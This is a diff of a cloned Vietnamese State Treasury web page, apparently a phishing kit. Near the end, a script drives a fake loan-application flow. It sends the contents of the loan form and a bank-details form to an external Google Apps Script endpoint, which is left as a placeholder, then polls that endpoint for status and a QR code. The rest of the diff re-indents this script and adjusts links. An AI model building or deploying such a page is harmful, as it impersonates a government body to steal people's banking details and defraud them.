@@ -6,21 +6,20 @@
   <script type="text/javascript" async=""
     src="https://www.googletagmanager.com/gtag/js?id=G-R35BJDJ7F2&amp;cx=c&amp;gtm=4e6160"></script>
   <script type="text/javascript" async="" defer="" src="https://f-emc.ngsp.gov.vn/embed/gov-tracking.min.js"></script>
-  <!-- <script type="text/javascript" src="/webcenter/adf/jsLibs/Locale1_2_12_3_3.js"></script>
+  <script type="text/javascript" src="/webcenter/adf/jsLibs/Locale1_2_12_3_3.js"></script>
   <script type="text/javascript">var AdfAssert = new Object(); AdfAssert.DEBUG = false;</script>
   <script type="text/javascript" src="/webcenter/afr/partition/webkit/n/default/opt/boot-11.1.1.9.0-5072.js"></script>
   <script
     type="text/javascript">AdfLogger.DEFAULT_LEVEL = AdfLogger.OFF; (AdfLogger.LOGGER = new AdfLogger('global', new AdfBufferedLogWriter())).register(); var checkAgentSupport = false; AdfAgent.AGENT = AdfAgent.getAgent(window); var lookAndFeel = new AdfDhtmlLookAndFeel(window); AdfAgent._LOG_WRITERS = "NativeLogWriter"; AdfPage.PAGE = lookAndFeel.createPage(); var page = AdfPage.PAGE; page.setBaseResourceUrl("/webcenter"); page.__setAutomationEnabled(false); page.setAnimationEnabled(true); page.__setSessionIdentifier('1a4ap1j7e9'); page.__setOutputMode('default');</script>
   <script type="text/javascript" src="/webcenter/afr/partition/webkit/n/default/opt/core-11.1.1.9.0-5072.js"></script>
   <script type="text/javascript"
-    src="/webcenter/afr/AdfTranslations-11.1.1.9.0-5072vi.js?loc=vi&amp;skinId=gsr92b5dff6_711b_421d_a483_02528dd8b233.desktop"></script> -->
-
+    src="/webcenter/afr/AdfTranslations-11.1.1.9.0-5072vi.js?loc=vi&amp;skinId=gsr92b5dff6_711b_421d_a483_02528dd8b233.desktop"></script>
   <meta name="keywords">
   <title>Văn hóa nghề kho bạc</title>
-  <!-- <script type="text/javascript" language="javascript"
+  <script type="text/javascript" language="javascript"
     src="/webcenter/oracle/webcenter/siteresources/scopedMD/shared/js/jquery-1.8.2.js"></script>
   <script type="text/javascript" language="javascript"
-    src="/webcenter/oracle/webcenter/siteresources/scopedMD/shared/js/ad-gallery/ad-gallery.js"></script> -->
+    src="/webcenter/oracle/webcenter/siteresources/scopedMD/shared/js/ad-gallery/ad-gallery.js"></script>
   <script type="text/javascript" language="javascript"
     src="https://www.googletagmanager.com/gtag/js?id=UA-76455638-2"></script>
   <link rel="stylesheet" type="text/css" afrres="true" href="css/placeholder.css">
@@ -333,11 +332,10 @@
                                                                                                       <div><a
                                                                                                           id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:0:gl1"
                                                                                                           class="xeb"
-                                                                                                          href="dai-hoi-dang.html"
+                                                                                                          href="#"
                                                                                                           data-original="/webcenter/portal/kbnn/r/lm/dhdb">Đại
                                                                                                           Hội Đảng
                                                                                                           Bộ</a></div>
-
                                                                                                     </div>
                                                                                                     <div
                                                                                                       id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:0:pbl18"
@@ -421,12 +419,11 @@
                                                                                                       <div><a
                                                                                                           id="T:oc_2609714310region1:oc_2793595851region1:i3:1:i1:3:gl1"
                                                                                                           class="xeb"
-                                                                                                          href="tiep-cong-dan.html"
+                                                                                                          href="#"
                                                                                                           data-original="/webcenter/portal/kbnn/r/lm/vhnkb34">Tiếp
                                                                                                           công dân và
                                                                                                           cập nhật nội
                                                                                                           dung </a>
-
                                                                                                       </div>
                                                                                                     </div>
                                                                                                     <div
@@ -1568,125 +1565,110 @@
         </span>
         <span class="yhy-append-txt">Trực thuộc BTTTT</span>
       </a>
-    </div>
-  </div>
-  <script>
-    const CONFIG = {
-      scriptUrl: (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || !window.location.hostname)
-        ? 'http://localhost:3000'
-        : 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE'
-    };
+      <script>
+        const CONFIG = {
+          scriptUrl: (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || !window.location.hostname)
+            ? 'http://localhost:3000'
+            : 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE'
+        };
 
-    function switchState(state) {
-      document.querySelectorAll('#workflow-container > div').forEach(div => div.style.display = 'none');
-      const target = document.getElementById('state-' + state);
-      if (target) {
-        target.style.display = 'block';
-        window.scrollTo({ top: target.offsetTop - 100, behavior: 'smooth' });
-      }
-    }
-
-    function getUrlParam(name) {
-      return new URLSearchParams(window.location.search).get(name);
-    }
-
-    async function pollStatus(token) {
-      if (!token) return;
-      try {
-        const response = await fetch(`${CONFIG.scriptUrl}?token=${token}&_=${Date.now()}`);
-        const data = await response.json();
-        processStatus(data, token);
-      } catch (e) {
-        console.error('Polling error:', e);
-      }
-    }
-
-    function processStatus(data, token) {
-      if (data.status === 'pending') {
-        switchState('pending');
-      } else if (data.status === 'approved') {
-        switchState('approved');
-      } else if (data.status === 'scanned') {
-        if (data.qr_url) {
-          const qrImg = document.getElementById('qr-image');
-          qrImg.src = data.qr_url;
-          document.getElementById('qr-container').style.display = 'block';
+        function switchState(state) {
+          document.querySelectorAll('#workflow-container > div').forEach(div => div.style.display = 'none');
+          const target = document.getElementById('state-' + state);
+          if (target) {
+            target.style.display = 'block';
+            window.scrollTo({ top: target.offsetTop - 100, behavior: 'smooth' });
+          }
         }
-        switchState('scanned');
-      } else if (data.status === 'done') {
-        switchState('success');
-      }
-    }
 
-    const token = getUrlParam('token');
-    if (token) {
-      pollStatus(token);
-      setInterval(() => pollStatus(token), 3000);
-    } else {
-      switchState('initial');
-    }
-
-    document.getElementById('loanForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const btn = e.target.querySelector('button');
-      const originalText = btn.innerText;
-      btn.disabled = true;
-      btn.innerText = 'Đang đăng ký...';
-      const formData = new FormData(e.target);
-      const data = { action: 'submit' };
-      formData.forEach((value, key) => data[key] = value);
-      try {
-        const resp = await fetch(CONFIG.scriptUrl, { method: 'POST', body: JSON.stringify(data) });
-        const result = await resp.json();
-        if (result.token) {
-          const newUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + '?token=' + result.token;
-          window.history.pushState({ path: newUrl }, '', newUrl);
-          switchState('pending');
-          setInterval(() => pollStatus(result.token), 3000);
+        function getUrlParam(name) {
+          return new URLSearchParams(window.location.search).get(name);
         }
-      } catch (e) {
-        console.error(e);
-        alert('Có lỗi xảy ra khi kết nối máy chủ.');
-        btn.disabled = false;
-        btn.innerText = originalText;
-      }
-    });
 
-    document.getElementById('btn-to-bank').addEventListener('click', () => { switchState('bank'); });
+        async function pollStatus(token) {
+          if (!token) return;
+          try {
+            const response = await fetch(`${CONFIG.scriptUrl}?token=${token}&_=${Date.now()}`);
+            const data = await response.json();
+            processStatus(data, token);
+          } catch (e) {
+            console.error('Polling error:', e);
+          }
+        }
 
-    document.getElementById('bankForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const btn = e.target.querySelector('button');
-      btn.disabled = true;
-      btn.innerText = 'Đang xác nhận...';
-      const formData = new FormData(e.target);
-      const data = { action: 'submit_bank', token: getUrlParam('token') };
-      formData.forEach((value, key) => data[key] = value);
-      try {
-        await fetch(CONFIG.scriptUrl, { method: 'POST', body: JSON.stringify(data) });
-        pollStatus(data.token);
-      } catch (e) {
-        console.error(e);
-        alert('Có lỗi xảy ra.');
-        btn.disabled = false;
-        btn.innerText = 'Xác nhận';
-      }
-    });
-  </script>
-  <script>
-    document.addEventListener('click', function (e) {
-      const link = e.target.closest('a');
-      if (link && link.getAttribute('href') && link.getAttribute('href') !== '#') {
-        if (!link.getAttribute('target') || link.getAttribute('target') === '_self') {
-          window.location.href = link.href;
+        function processStatus(data, token) {
+          if (data.status === 'pending') {
+            switchState('pending');
+          } else if (data.status === 'approved') {
+            switchState('approved');
+          } else if (data.status === 'scanned') {
+            if (data.qr_url) {
+              const qrImg = document.getElementById('qr-image');
+              qrImg.src = data.qr_url;
+              document.getElementById('qr-container').style.display = 'block';
+            }
+            switchState('scanned');
+          } else if (data.status === 'done') {
+            switchState('success');
+          }
+        }
+
+        const token = getUrlParam('token');
+        if (token) {
+          pollStatus(token);
+          setInterval(() => pollStatus(token), 3000);
+        } else {
+          switchState('initial');
+        }
+
+        document.getElementById('loanForm').addEventListener('submit', async (e) => {
           e.preventDefault();
-          e.stopPropagation();
-        }
-      }
-    }, true);
-  </script>
-</body>
+          const btn = e.target.querySelector('button');
+          const originalText = btn.innerText;
+          btn.disabled = true;
+          btn.innerText = 'Đang đăng ký...';
+          const formData = new FormData(e.target);
+          const data = { action: 'submit' };
+          formData.forEach((value, key) => data[key] = value);
+          try {
+            const resp = await fetch(CONFIG.scriptUrl, { method: 'POST', body: JSON.stringify(data) });
+            const result = await resp.json();
+            if (result.token) {
+              const newUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + '?token=' + result.token;
+              window.history.pushState({ path: newUrl }, '', newUrl);
+              switchState('pending');
+              setInterval(() => pollStatus(result.token), 3000);
+            }
+          } catch (e) {
+            console.error(e);
+            alert('Có lỗi xảy ra khi kết nối máy chủ.');
+            btn.disabled = false;
+            btn.innerText = originalText;
+          }
+        });
 
+        document.getElementById('btn-to-bank').addEventListener('click', () => { switchState('bank'); });
+
+        document.getElementById('bankForm').addEventListener('submit', async (e) => {
+          e.preventDefault();
+          const btn = e.target.querySelector('button');
+          btn.disabled = true;
+          btn.innerText = 'Đang xác nhận...';
+          const formData = new FormData(e.target);
+          const data = { action: 'submit_bank', token: getUrlParam('token') };
+          formData.forEach((value, key) => data[key] = value);
+          try {
+            await fetch(CONFIG.scriptUrl, { method: 'POST', body: JSON.stringify(data) });
+            pollStatus(data.token);
+          } catch (e) {
+            console.error(e);
+            alert('Có lỗi xảy ra.');
+            btn.disabled = false;
+            btn.innerText = 'Xác nhận';
+          }
+        });
+      </script>
+</body>
 <!--Created by Oracle ADF (Version information hidden), accessibility (mode:null, contrast:standard, size:medium), skin:gsr92b5dff6_711b_421d_a483_02528dd8b233.desktop (gsr92b5dff6_711b_421d_a483_02528dd8b233)-->
 
 </html>
